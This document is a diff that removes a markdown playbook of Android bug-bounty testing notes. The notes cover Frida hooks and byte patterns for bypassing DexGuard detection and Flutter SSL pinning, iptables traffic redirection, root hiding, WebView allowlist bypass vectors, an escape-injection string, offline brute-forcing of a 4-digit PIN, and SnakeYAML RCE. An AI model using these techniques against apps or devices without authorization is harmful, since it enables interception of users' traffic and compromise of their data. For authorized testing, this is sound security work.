-2. **hluda-server** — anti-detection Frida build (see below), solves Frida detection but NOT root detection
-3. **Frida Gadget injection** — inject into patched APK, no frida-server process to detect
-4. **Non-rooted device** — no root indicators to find; use WiFi proxy for traffic capture
-5. **Static evidence only** — for bug bounty, code-level evidence is sufficient when the code path is unambiguous
-
-**Working Frida bypass (v24 pattern):** (1) hook `fopen`/`fgets` to filter Frida lines from `/proc/self/maps`, (2) hook `pthread_create` to neutralize kill thread, (3) patch inline SVC to NOP after library loads, (4) hook libc `syscall`/`kill`/`_exit`/`abort` as safety nets. The maps filter is the PRIMARY defense — if detection doesn't see Frida, the kill thread is never spawned. See `dexguard-appfence-bypass.md`.
-
-**Inline syscall (unbypassable via Frida):** When DexGuard uses inline `svc #0` assembly for exit_group, ALL userspace hooks fail — libc exit/kill hooks, syscall() wrapper hooks, pthread_create blocking. Symptoms: process exits cleanly (code 0), no hook messages fire for exit. The ONLY solutions are: (1) Shamiko/Zygisk (kernel-level root hiding so detection never triggers), (2) non-rooted device, (3) APK patching to remove detection code. Don't waste hours on Frida bypass — static analysis evidence is sufficient for bug bounty.
-
-**pthread_create thread identification:** To identify which native lib runs root detection, hook `pthread_create` and log `module.name` for each `start_routine`. Filter out system libs (libc, libart, libhwui, libutils, libgui). The detection thread is usually from a small obfuscated lib (e.g., 7KB `libh9740d.so`). But blocking the thread may crash the app if it's not actually the detection (e.g., ANR handler).
-
-**Server-side device attestation (GoPay-1000 pattern):** Even when local root detection is bypassed (app stays alive, UI renders), the server may reject requests via Play Integrity / SafetyNet attestation. Symptom: app shows security error modal on login attempt (e.g., "Ada masalah keamanan (GoPay-1000)"). This CANNOT be bypassed with Frida alone — requires Zygisk + PlayIntegrityFix module. Document as a positive security control in the report, not a vulnerability.
-
-**Auth-gated API testing when root blocks login:** When the rooted device can't log in (DexGuard kills app) and the non-rooted device isn't adb-accessible, use **WiFi proxy** (no adb needed): (1) Start Burp/Caido on Mac listening on 0.0.0.0:8080, (2) On phone: WiFi settings → proxy → Mac IP:8080, (3) Download CA cert via phone browser (http://burp), (4) Install cert, (5) Use app normally — all API calls captured. This works when no cert pinning is present. If cert pinning IS present, this approach fails and you must fix root hiding first.
-
-### Flutter SSL Pinning Bypass (BoringSSL in libflutter.so)
-
-**Problem:** Flutter uses its own BoringSSL in `libflutter.so` — ignores system proxy AND system CA store. Standard SSL bypass scripts (objection, generic Frida) don't work.
-
-**Working approach (ARM64, Flutter 3.x):**
-
-1. Find executable ranges only (avoid access violations from unmapped pages):
-```javascript
-var ranges = Process.enumerateRanges('r-x');
-var flutterRanges = ranges.filter(r => r.base.compare(m.base) >= 0 && r.base.compare(m.base.add(m.size)) < 0);
-```
-
-2. Scan for `ssl_crypto_x509_session_verify_cert_chain` prologue pattern:
-   - Primary: `FF 03 05 D1 FD 7B 0F A9` (sub sp, #0x140; stp x29, x30)
-   - This typically yields 3-5 matches — hook ALL of them to return success
-
-3. Hook all candidates (one of them is the verify function):
-```javascript
-Interceptor.attach(addr, { onLeave: function(retval) { retval.replace(0x1); } });
-```
-
-**Critical pitfall:** Do NOT use `Memory.scanSync(m.base, m.size, pattern)` directly — libflutter.so has unmapped pages within its address range that cause access violations. Always filter through `Process.enumerateRanges('r-x')` first.
-
-**Traffic interception for Flutter:** Since Flutter ignores system proxy, use iptables DNAT:
-```bash
-# Get app UID from packages.list
-UID=$(grep <package> /data/system/packages.list | awk '{print $2}')
-iptables -t nat -A OUTPUT -p tcp -m owner --uid-owner $UID --dport 443 -j DNAT --to <host_ip>:8080
-iptables -t nat -A OUTPUT -p tcp -m owner --uid-owner $UID --dport 80 -j DNAT --to <host_ip>:8080
-```
-
-**Verification:** Confirm `CERTIFICATE_VERIFY_FAILED` string exists in libflutter.so readable ranges to confirm BoringSSL is present. If the string is at offset ~0x26xxxx and your pattern matches are at ~0x5axxxx-0x9bxxxx, you're in the right area.
-
-**For version-specific patterns, spawn scripts, and alternative approaches:** See `references/flutter-ssl-bypass.md`
-
-**For Eversafe SDK token architecture, replay technique, and staging vs production behavior:** See `references/eversafe-attestation.md`
-
-### Tyk API Gateway Pattern (Banking Apps)
-
-Some banking apps use Tyk as API gateway with a static auth key:
-- Header: `x-tyk-auth: <static_hex_key>`
-- This key is the same across all requests from the app
-- Extractable from traffic capture
-- BUT: additional layers (Eversafe, JWT Bearer) still required
-- The Tyk key alone returns `MISSING_API_TOKEN` or `EMPTY_AUTH_TOKEN`
-
-When you see `x-tyk-auth` + `x-eversafe-verification-token` + `Authorization: Bearer`, the app has 3-layer auth:
-1. Gateway key (static, extractable)
-2. Device attestation (dynamic, device-bound)
-3. User session (JWT, short-lived)
-
-This makes direct API replay nearly impossible without going through the app.
-
-### Burp MCP Integration for Traffic Analysis
-
-When Burp Suite has the MCP extension installed (BApp Store), use it to query proxy history programmatically:
-
-```python
-# Key tools available:
-# - get_proxy_http_history(count, offset) — all history
-# - get_proxy_http_history_regex(regex, count, offset) — filtered
-# - send_http1_request / send_http2_request — replay requests
-
-# Connection: java -jar mcp-burp.jar --sse-url http://127.0.0.1:9876
-# Protocol: JSON-RPC 2.0 over stdio
-```
-
-**Pitfalls:**
-- `get_proxy_http_history` REQUIRES `count` and `offset` params (not optional)
-- Response entries are newline-separated JSON objects (not a JSON array)
-- Binary response bodies cause JSON parse errors — use try/except per entry
-- SSE endpoint (port 9876) appears to hang on curl — it's long-polling, use `--max-time`
-- The MCP server must be tested with `hermes mcp test burpsuite` to verify connectivity
-
-### hluda-server (Anti-Detection Frida Build)
-
-When regular frida-server is detected (port 27042, /proc/self/maps strings), use hluda-server — a Frida build with anti-detection patches (randomized port, stripped strings, hidden from maps).
-
-- Path on device: `/data/local/tmp/hluda-server`
-- Start: `su -c '/data/local/tmp/hluda-server -D'`
-- Uses same `frida -U` client commands as standard frida-server
-- **hluda solves Frida detection; Shamiko solves root detection** — they address different problems
-- For DexGuard apps that use inline syscalls, even hluda + Frida hooks may not suffice — the detection bypasses all userspace instrumentation
-
-### KernelSU / Magisk / Zygisk (Root Hiding Decision Tree)
-
-**Decision tree based on kernel version:**
-
-1. **Kernel ≥5.10:** Use KernelSU (latest .ko + ksud) → install Zygisk Next → install Shamiko → add target app to DenyList
-2. **Kernel 4.4–5.9:** Modern KernelSU (v3.x) no longer ships .ko modules (minimum kernel 5.10). Options:
-   - Flash a custom kernel with KernelSU built-in, OR
-   - **Switch to Magisk** (supports all kernels, has native Zygisk + Shamiko) — this is the more reliable path
-3. **Any kernel with Magisk:** Magisk + Zygisk (built-in) + Shamiko + DenyList — proven stack for DexGuard/AppFence apps
-
-**Version requirements:**
-- Zygisk Next requires KernelSU ksud 0.9+. KernelSU 0.7.1 is too old.
-- Updating ksud requires a matching kernel module — you can't just replace the binary
-- If KernelSU version is too old for Zygisk (< 0.9.x on kernel 4.4), options: (a) switch to Magisk, (b) use non-rooted device with WiFi proxy, (c) accept limitation and submit static findings only
-
-### Frida Spawn / Compatibility
-
-**Frida 16.x changes:** `--no-pause` flag removed — apps auto-resume on spawn. Use:
-```bash
-frida -U -f <package> -l script.js
-```
-
-**Starting frida-server:** Required for `frida -U -f <package>` on rooted devices:
-```bash
-adb shell "su -c '/data/local/tmp/frida-server -D'"
-```
-Without it, you get "need Gadget to attach on jailed Android" even on rooted devices. Always verify with `frida-ps -U` before spawning.
-
-**Deep link two-step pattern:** Do NOT use `device.spawn(url=...)` — it doesn't work for Android intents. Instead:
-1. Spawn app normally → install hooks → resume
-2. Trigger deep link via separate command: `adb shell am start -a android.intent.action.VIEW -d "scheme://..."`
-
-This two-step pattern is required for hooking deep link handlers. Use Python frida bindings for complex hooks (spawn + attach + inject + trigger deep link in sequence).
-
-**Frida NativeCallback GC pitfall:** When replacing function pointers (e.g., `pthread_create` start_routine) with `new NativeCallback(...)` inside `onEnter`, the callback gets garbage-collected before the thread runs → SIGSEGV crash. **Fix:** declare ALL NativeCallbacks and Memory.alloc buffers as GLOBAL variables at script top level. Never create inline NativeCallbacks inside hook handlers. This is the #1 cause of "bypass works once then crashes on retry."
-
-### Device & Connectivity
-
-- **Locked device workaround:** When the device screen is locked and UI automation fails, validate findings via non-UI paths: `adb shell am broadcast` (broadcast receivers), `adb shell am start` (exported activities), `run-as` (data extraction on debuggable apps), and `adb shell content query` (content providers). These don't require an unlocked screen.
-- **Device-to-host connectivity:** When the device can't reach the host IP (different subnet, firewall, VPN), use `adb reverse tcp:PORT tcp:PORT` to forward device localhost to host. Then use `http://127.0.0.1:PORT/` in exploit URIs. Always verify with `adb shell curl http://127.0.0.1:PORT/file` before triggering the exploit. This is more reliable than finding the correct network interface IP.
-- **App restart issues:** Use `adb shell am start -S -W` to force-stop then start. Pre-grant permissions with `pm grant` and `appops set` to avoid dialogs blocking the flow.
-
-### High-Value Attack Patterns
-
-- **WebView + @JavascriptInterface = high-value target:** When an app has JS enabled + addJavascriptInterface, map ALL exposed methods. If any method calls Runtime.exec(), ProcessBuilder, or shell commands — that's an RCE chain. XSS in the WebView (via deep links, intent data, or stored content) becomes the trigger.
-- **SecureWebView pattern (server-side domain allowlist):** Modern apps (Gojek, fintech) wrap WebView in a `SecureWebView` subclass that overrides `loadUrl()` with a server-fetched domain allowlist check. Even if the deep link handler passes unvalidated URLs, the WebView blocks loading non-allowlisted domains. Detection: look for `extends WebView` with `super.loadUrl()` gated behind a boolean check, and config keys like `DOMAIN_WHITELIST_BATCH_*` or `JS_BRIDGE_WHITELIST_BATCH_*`. This downgrades a "no validation in handler" finding from Critical to Medium unless you can bypass the allowlist. **Bypass vectors (in order):** (1) `data:` URI scheme — may bypass if allowlist only checks `http`/`https` schemes. **CAVEAT:** depends on feature flag state — always verify dynamically before rating as Confirmed. (2) Open redirect on an allowed domain. (3) Partner with `allowAllAccess=true`. (4) Empty allowlist fallback (fail-open when `DOMAIN_WHITELIST_BATCH_SIZE` returns 0). (5) Feature flag OFF (unlikely in production). See `deeplink-webview-hijack.md`.
-- **Deep link escape bypass patterns:** When the app escapes single quotes but NOT backslashes, inject `\\\'` — after escape it becomes `\\\\\'` which in JS is literal backslash + string terminator. Always check: does the escape cover `\\`, `"`, `'`, backtick, `$`, and newlines?
-- **Intent URI parsing (`Intent.parseUri`) is a high-value target:** When an app parses user-controlled strings as intent URIs (look for `Intent.parseUri(url, 1)` or `Intent.URI_INTENT_SCHEME`), it can launch ANY activity (including non-exported ones) with arbitrary extras. The attack surface is wherever the URL string originates: UI input, database, backup files, deep link parameters, QR codes. Even if the app "sanitizes" the intent before launching, check what the sanitizer ADDS (not just removes).
-- **Backup/restore bypasses input validation:** Apps that implement their own backup (JSON/XML to external storage) often skip the validation applied on the UI path. If `isValidUrl()` blocks `intent:` schemes on the add-entry UI, but `restoreEntries()` reads raw JSON without checking — inject via modified backup file. Check: (1) backup format (plaintext JSON? XML?), (2) restore validation (usually missing), (3) code paths that handle `intent:` scheme. Common in password managers, note apps, bookmark managers.
-- **Native "sanitizer" as enabler pattern:** When a native function strips extras/data from an intent but then ADDS a validation flag (e.g., `putExtra("VALID", true)`), the sanitizer IS the exploit enabler. The app assumes only sanitized intents reach the protected activity, but the sanitizer itself grants access. Reverse the native function to confirm: look for `removeExtra` loop followed by `putExtra` with a boolean `true` (mov w4, 1 in arm64).
-- **Exported ContentProvider brute-force:** When a ContentProvider is exported without permission protection and uses a small keyspace for access control (e.g., 4-digit PIN), extract crypto parameters from assets/resources and brute-force offline. Pattern: `content query --uri content://authority --where "pin=XXXX"`. For offline cracking: extract encryptedData/salt/iv/iterations from APK assets, then PBKDF2+AES decrypt in Python loop. 4-digit PIN = 10K attempts = <1 second.
-- **SnakeYAML deserialization RCE:** When an app uses `yaml.load()` (not `yaml.loadAs()` or `SafeConstructor`), it allows arbitrary object instantiation via `!!fully.qualified.ClassName [args]` tags. Look for gadget classes with dangerous constructors (Runtime.exec, ProcessBuilder, file I/O). Common in config editor/viewer apps. The safe alternative is `new Yaml(new SafeConstructor(new LoaderOptions()))`.
-
-### Native Code Analysis
-
-- **Static analysis pattern for native lib hijack:** Look for `System.load()` with paths under `getFilesDir()`/`getCacheDir()` combined with unsanitized `getLastPathSegment()` in file download handlers.
-- **XOR-obfuscated strings in native libs:** Common pattern in MHL challenges. Decode with: `''.join(chr(b ^ key) for b in byte_array)`. Try keys 0x00-0x7F. Look for readable scheme strings (intent:, http://, https://) to identify the key quickly.
-- **r2 for quick native function analysis:** When Ghidra isn't running, use `r2 -q -c 'aa;s sym.Java_pkg_Class_method;pdf' lib.so` to disassemble JNI functions. Look for JNI call offsets (0xf8=GetObjectClass, 0x108=GetMethodID, 0x538=NewStringUTF, 0x2f0=GetFieldID, 0x2f8=GetObjectField, 0x558=GetArrayLength, 0x568=GetObjectArrayElement) to understand what Java methods the native code calls.
-
-### Unity / IL2CPP
-
-- **Flutter deep link handler not in DEX:** When a Flutter app declares a `DeepLinkHandlerActivity` in the manifest but the class doesn't exist in any DEX file, it's handled by the Flutter engine via `flutter_deeplinking_enabled` meta-data and `HANDLE_DEEPLINKING_META_DATA_KEY`. The deep link URI is passed directly to the Dart layer (libapp.so) where a `DeeplinkBloc` routes it. You won't find the handler in jadx — instead, extract route names from `strings libapp.so | grep -E "^/"` and deep link config from `strings libapp.so | grep -i deeplink`.
-- **Flutter app static analysis strategy:** For Flutter apps, jadx only shows the thin Java wrapper (Application class, native SDKs, third-party Java libraries). The real app logic is in `libapp.so`. Key extraction commands:
-  - Routes: `strings libapp.so | grep -E "^/[a-z]" | sort -u`
-  - API endpoints: `strings libapp.so | grep -iE "https?://" | sort -u`
-  - Deep link config: `strings libapp.so | grep -iE "deeplink|deep_link" | sort -u`
-  - WebView routes: `strings libapp.so | grep -iE "webview|web_view" | sort -u`
-  - Dart package paths: `strings libapp.so | grep "^package:" | sort -u` (reveals module structure)
-  - Secrets: `strings libapp.so | grep -iE "api.key|secret|token|password|firebase" | sort -u`
-- **Staging builds have relaxed security:** Banking apps with Eversafe/DexGuard often disable root detection on staging builds. Always try launching on rooted device first — if it survives, you skip the entire bypass effort.
-
-- **Unity IL2CPP reverse engineering:** For Unity 2020.x IL2CPP apps, all C# class/method/field/string-literal names are in `global-metadata.dat`. Key patterns: (1) grep for `[ClassName]` log prefixes to find the relevant class, (2) grep for method names like `Handle*`, `check*`, `validate*`, `get*` to understand the flow, (3) look for field names like `domainRegex`, `updateHost` that reveal validation logic, (4) coroutine names like `<MethodName>d__N` reveal async operations. The actual game logic is NOT in `classes.dex` — it's in `libil2cpp.so` + metadata.
-- **Unity IL2CPP deep link parameter discovery:** Hardcoded URLs in `global-metadata.dat` may use DIFFERENT query parameter names than the deep link handler expects. Don't assume the parameter name from hardcoded strings — test systematically. Use `strings global-metadata.dat | grep -E "^(check|get|set|validate|parse)[A-Z]"` to find method names that hint at the actual parameter (e.g., `checkHost` → parameter is `host=`, not `patch=` from the hardcoded URL). When host extraction always returns empty despite correct URI format, the parameter name is likely wrong.
-- **Mono/Unity custom scheme URI parsing quirk:** In Unity 2020.x (Mono runtime), `System.Uri` does NOT reliably parse query parameters from custom scheme URIs (e.g., `customscheme://host?key=value`). The `Uri.Query` property may return empty. Apps work around this with manual string parsing or by using Android's Java-side `Uri.getQueryParameter()` via JNI. When testing deep links, if the app receives the full URI string (confirmed via logcat) but fails to extract parameters, try different parameter names — the extraction method may be parameter-name-specific.
-
-### Phase Skipping Rules
-
-- **Offline/no-network apps:** When the app has no internet permission and no HTTP URLs in source, mark Phases 4 (Traffic Analysis) and 8 (API Testing) as N/A immediately after Phase 2. Focus Phase 6 on broadcast exploitation, SharedPreferences validation, and data storage inspection.
-- **Client-side-only exploit chains (WebView RCE, broadcast injection):** When the exploit is entirely client-side (no server API involved), mark Phase 8 as N/A. Phase 9 validates the exploit dynamically.
-
-### Exploit Hosting & Delivery
-
-- **Exploit hosting pitfall:** Python's `http.server` decodes `%2F` in URL paths and resolves `../`, causing 404 for path traversal payloads. Use a custom server that serves the payload for any request path (see `android-path-traversal-rce.md`).
-- **Runtime.exec(String) splitting pitfall:** `Runtime.exec(String)` uses `StringTokenizer` to split on whitespace — shell features (pipes, redirects, semicolons) are NOT interpreted. `exec("sh -c id")` works (3 tokens: sh, -c, id) but `exec("sh -c id > /tmp/out")` fails (sh only executes "id", "> /tmp/out" becomes $0/$1). Workaround: push a script to an executable path first, then exec the script path. Or use `exec(String[])` if you control the call site.
